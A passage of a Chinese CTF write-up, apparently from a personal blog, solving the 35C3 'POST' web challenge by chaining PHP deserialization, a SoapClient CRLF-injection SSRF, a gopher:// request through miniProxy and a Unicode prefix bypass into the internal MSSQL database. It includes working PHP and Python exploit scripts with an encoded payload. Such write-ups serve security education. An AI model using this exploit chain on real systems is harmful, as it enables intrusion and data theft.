&#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">truncate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $USER;</span><br><span class="line">        DB::query(<span class="string">"DELETE FROM posts WHERE userid = ?"</span>, <span class="keyword">array</span>($USER-&gt;uid));</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">load</span><span class="params">($id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $USER;</span><br><span class="line">        $res = DB::query(<span class="string">"SELECT * FROM posts WHERE userid = ? AND id = ?"</span>,</span><br><span class="line">            <span class="keyword">array</span>($USER-&gt;uid, $id));</span><br><span class="line">        <span class="keyword">if</span> (!$res) <span class="keyword">die</span>(<span class="string">"db error"</span>);</span><br><span class="line">        $res = $res[<span class="number">0</span>];</span><br><span class="line">        $post = <span class="keyword">new</span> Post($res[<span class="string">"title"</span>], $res[<span class="string">"content"</span>], $res[<span class="string">"attachment"</span>]);</span><br><span class="line">        $post-&gt;id = $id;</span><br><span class="line">        <span class="keyword">return</span> $post;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">loadall</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $USER;</span><br><span class="line">        $result = <span class="keyword">array</span>();</span><br><span class="line">        $posts = DB::query(<span class="string">"SELECT id FROM posts WHERE userid = ? ORDER BY id DESC"</span>, <span class="keyword">array</span>($USER-&gt;uid)) ;</span><br><span class="line">        <span class="keyword">if</span> (!$posts) <span class="keyword">return</span> $result;</span><br><span class="line">        <span class="keyword">foreach</span> ($posts <span class="keyword">as</span> $p) &#123;</span><br><span class="line">            $result[] = Post::load($p[<span class="string">"id"</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $result;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $str = <span class="string">"&lt;h2&gt;&#123;$this-&gt;title&#125;&lt;/h2&gt;"</span>;</span><br><span class="line">        $str .= <span class="keyword">$this</span>-&gt;content;</span><br><span class="line">        $str .= <span class="string">"&lt;hr&gt;Attachments:&lt;br&gt;&lt;il&gt;"</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;attachment <span class="keyword">as</span> $attach) &#123;</span><br><span class="line">            $str .= <span class="string">"&lt;li&gt;$attach&lt;/li&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $str .= <span class="string">"&lt;/il&gt;"</span>;</span><br><span class="line">        <span class="keyword">return</span> $str;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以发现<code>DB</code>类的<code>query</code>方法把接收<code>sql</code>语句后把执行结果丢给了<code>retrieve_values</code>方法，而该方法存在一处反序列化操作，且要求反序列化字符串开头为<code>$serializedobject$</code></p>
+<p>在 mssql 中,<strong>MSSQL会自动将全角unicode字符转换为ASCII表示形式</strong>，$s℮rializedobject$ 入库后会变成 $serializedobject$ ，注意前者的℮不是 ASCII 的 e，整个字符串的 16 进制如下，可见前者的℮的 hex 是 E284AE，而后者 e 的 ASCII 是 0x65</p>
+<p>根据post.php，可以通过SoapClient<code>通过SSRF打MSSQL，前提是要能够触发它的</code><strong>call<code>方法。
+类</code>Attachment<code>的</code></strong>tostring<code>方法中有一个</code>$this-&gt;za-&gt;open<code>操作，我们将</code>SoapClient<code>序列化为</code>$za<code>，然后触发其</code>__tostring`方法即可SSRF。</p>
+<p>而<code>default.php</code>中实例化了<code>Post</code>类，把<code>$_POST[&quot;title&quot;], $_POST[&quot;content&quot;], $attachments</code>传了进去，并调用了<code>save</code>方法</p>
+<p>然后又调用<code>loadall()</code>方法执行数据库查询操作，此时会将返回值开头为<code>$serializedobject$</code>的字符串进行反序列化操作并将返回的值打印触发<code>Post</code>类的<code>__toString</code>方法，而返回值含有反序列化对象，因此又可以触发反序列化对象的<code>__toString</code>方法，从而可以SSRF。</p>
+<p>exp：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Attachment</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $za = <span class="keyword">NULL</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;za = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>,<span class="keyword">array</span>(<span class="string">'location'</span>=&gt;<span class="string">'your_ip'</span>,<span class="string">'uri'</span>=&gt;<span class="string">'your_ip'</span>));   </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$c=<span class="keyword">new</span> Attachment();</span><br><span class="line">$aaa=serialize($c);</span><br><span class="line"><span class="keyword">echo</span> $aaa;</span><br></pre></td></tr></table></figure>
+<p>由Nginx配置文件可知，miniProxy代理监听在本地的<code>8080</code>端口，且只接收Get请求,而<code>SoapClient</code>发送的是POST请求。</p>
+<p>得知<code>SoapClientl</code>的<code>_user_agent</code>属性存在CRLF注入，我们可以通过<code>\r\n</code>再注入一个GET请求。<br>另外<code>miniProxy</code>只能代理 <code>http / https</code>请求,可以通过<code>gopher:///</code>绕过，因为miniProxy仅在设置<code>host</code>时验证<code>http / https</code>。或者可以重定向到一个<code>gopher请求</code>来绕过。</p>
+<p>gopher会在请求后加上一个<code>\r\n</code> ，因此构造gopher请求时要在sql语句后加一个注释符<code>-- -</code>, 通过插入<code>DEBUG</code>头我们可以获取到我们的<code>UID</code></p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"> </span><br><span class="line">host=<span class="string">"http://50.3.232.201:8000/?"</span></span><br><span class="line">post=&#123;</span><br><span class="line">    <span class="string">"username"</span>:<span class="string">"123456"</span>,</span><br><span class="line">    <span class="string">"password"</span>:<span class="string">"123456"</span>,</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">r=requests.Session()</span><br><span class="line">url1=host+<span class="string">"page=login"</span></span><br><span class="line">r.post(url=url1,data=post)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fetch_uid</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> r.get(host, headers=&#123;<span class="string">"Debug"</span>: <span class="string">"1"</span>&#125;).content.decode().split(<span class="string">"int("</span>)[<span class="number">1</span>].split(<span class="string">")"</span>)[<span class="number">0</span>]</span><br><span class="line">payload=base64.b64decode(<span class="string">"JHNlcmlhbGl6ZWRvYmplY3TvvIRPOjEwOiJBdHRhY2htZW50IjoxOntzOjI6InphIjtPOjEwOiJTb2FwQ2xpZW50IjozOntzOjM6InVyaSI7czozNToiaHR0cDovL2xvY2FsaG9zdDo4MDgwL21pbmlQcm94eS5waHAiO3M6ODoibG9jYXRpb24iO3M6MzU6Imh0dHA6Ly9sb2NhbGhvc3Q6ODA4MC9taW5pUHJveHkucGhwIjtzOjExOiJfdXNlcl9hZ2VudCI7czoxMzk5OiJBQUFBQUhhaGEKCkdFVCAvbWluaVByb3h5LnBocD9nb3BoZXI6Ly8vZGI6MTQzMy9BJTEyJTAxJTAwJTJGJTAwJTAwJTAxJTAwJTAwJTAwJTFBJTAwJTA2JTAxJTAwJTIwJTAwJTAxJTAyJTAwJTIxJTAwJTAxJTAzJTAwJTIyJTAwJTA0JTA0JTAwJTI2JTAwJTAxJUZGJTAwJTAwJTAwJTAxJTAwJTAxJTAyJTAwJTAwJTAwJTAwJTAwJTAwJTEwJTAxJTAwJURFJTAwJTAwJTAxJTAwJUQ2JTAwJTAwJTAwJTA0JTAwJTAwdCUwMCUxMCUwMCUwMCUwMCUwMCUwMCUwMFQwJTAwJTAwJTAwJTAwJTAwJTAwJUUwJTAwJTAwJTA4JUM0JUZGJUZGJUZGJTA5JTA0JTAwJTAwJTVFJTAwJTA3JTAwbCUwMCUwQSUwMCU4MCUwMCUwOCUwMCU5MCUwMCUwQSUwMCVBNCUwMCUwOSUwMCVCNiUwMCUwMCUwMCVCNiUwMCUwNyUwMCVDNCUwMCUwMCUwMCVDNCUwMCUwOSUwMCUwMSUwMiUwMyUwNCUwNSUwNiVENiUwMCUwMCUwMCVENiUwMCUwMCUwMCVENiUwMCUwMCUwMCUwMCUwMCUwMCUwMGElMDB3JTAwZSUwMHMlMDBvJTAwbSUwMGUlMDBjJTAwaCUwMGElMDBsJTAwbCUwMGUlMDBuJTAwZyUwMGUlMDByJTAwJUMxJUE1UyVBNVMlQTUlODMlQTUlQjMlQTUlODIlQTUlQjYlQTUlQjclQTVuJTAwbyUwMGQlMDBlJTAwLSUwMG0lMDBzJTAwcyUwMHElMDBsJTAwbCUwMG8lMDBjJTAwYSUwMGwlMDBoJTAwbyUwMHMlMDB0JTAwVCUwMGUlMDBkJTAwaSUwMG8lMDB1JTAwcyUwMGMlMDBoJTAwYSUwMGwlMDBsJTAwZSUwMG4lMDBnJTAwZSUwMCUwMSUwMSUwMSUwRSUwMCUwMCUwMSUwMCUxNiUwMCUwMCUwMCUxMiUwMCUwMCUwMCUwMiUwMCUwMCUwMCUwMCUwMCUwMCUwMCUwMCUwMCUwMSUwMCUwMCUwMGklMDBuJTAwcyUwMGUlMDByJTAwdCUwMCUyMCUwMGklMDBuJTAwdCUwMG8lMDAlMjAlMDBwJTAwbyUwMHMlMDB0JTAwcyUwMCUyMCUwMCUyOCUwMHUlMDBzJTAwZSUwMHIlMDBpJTAwZCUwMCUyQyUwMCUyMCUwMHQlMDBpJTAwdCUwMGwlMDBlJTAwJTJDJTAwJTIwJTAwYyUwMG8lMDBuJTAwdCUwMGUlMDBuJTAwdCUwMCUyQyUwMCUyMCUwMGElMDB0JTAwdCUwMGElMDBjJTAwaCUwMG0lMDBlJTAwbiUwMHQlMDAlMjklMDAlMjAlMDB2JTAwYSUwMGwlMDB1JTAwZSUwMHMlMDAlMjAlMDAlMjglMDAyJTAwMCUwMDAlMDAlMkMlMDAlMjAlMDAlMjIlMDB0JTAwZSUwMHMlMDB0JTAwJTIyJTAwJTJDJTAwJTIwJTAwJTI4JTAwcyUwMGUlMDBsJTAwZSUwMGMlMDB0JTAwJTIwJTAwZiUwMGwlMDBhJTAwZyUwMCUyMCUwMGYlMDByJTAwbyUwMG0lMDAlMjAlMDBmJTAwbCUwMGElMDBnJTAwLiUwMGYlMDBsJTAwYSUwMGclMDAlMjklMDAlMkMlMDAlMjAlMDAlMjIlMDB0JTAwZSUwMHMlMDB0JTAwJTIyJTAwJTI5JTAwJTNCJTAwJTNCJTAwLSUwMC0lMDAlMjAlMDAtJTAwIEhUVFAvMS4xCkhvc3Q6IGxvY2FsaG9zdAoKIjt9fQ=="</span>)</span><br><span class="line">print(payload)</span><br><span class="line">data=&#123;</span><br><span class="line">    <span class="string">"title"</span>:<span class="string">"123456"</span>,</span><br><span class="line">    <span class="string">"content"</span>:payload,</span><br><span class="line">&#125;</span><br><span class="line">url2=host+<span class="string">"action=create"</span></span><br><span class="line">r.post(url=url2,data=data)</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/12/19/HCTF2018-hideandseek/" rel="next" title="HCTF2018-hideandseek">
+                <i class="fa fa-chevron-left"></i> HCTF2018-hideandseek
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/08/27/获取你耳机的蓝牙版本/" rel="prev" title="获取你耳机的蓝牙版本">
+                获取你耳机的蓝牙版本 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="FDrag0n">
+            
+              <p class="site-author-name" itemprop="name">FDrag0n</p>
+              <p class="site-description motion-element" itemprop="description">菜鸡安全狗</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">22</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/fdrag0n" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#35C3-POST"><span class="nav-text">35C3-POST</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">FDrag0n</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v6.0.1</div>
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+
+
+
+  
+  
+
+
+
+  
+  
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/three.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/three-waves.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/canvas_lines.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/canvas_sphere.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.0.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.0.1"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=6.0.1"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=6.0.1"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.0.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.0.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.0.1"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/33.model.json"},"display":{"position":"right","width":180,"height":450},"mobile":{"show":true},"log":false});</script></body>
+</html>
